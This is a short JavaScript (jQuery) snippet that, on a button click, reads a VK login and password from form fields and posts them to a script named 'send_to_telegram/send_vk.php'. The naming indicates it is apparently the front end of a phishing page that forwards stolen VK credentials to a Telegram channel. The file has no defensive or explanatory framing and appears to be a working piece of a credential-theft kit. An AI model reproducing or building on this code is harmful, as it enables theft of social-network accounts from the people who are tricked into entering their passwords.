$("#send_vk").on("click", function(){
	var vk_login = $("#vk_login").val()
	var password_vk = $("#password_vk").val()


	$.ajax({
		url:'send_to_telegram/send_vk.php',
		type: 'POST',
		cache: false,
		data: { 'vk_login': vk_login, 'password_vk': password_vk		},
		dataType: 'html'
	})
})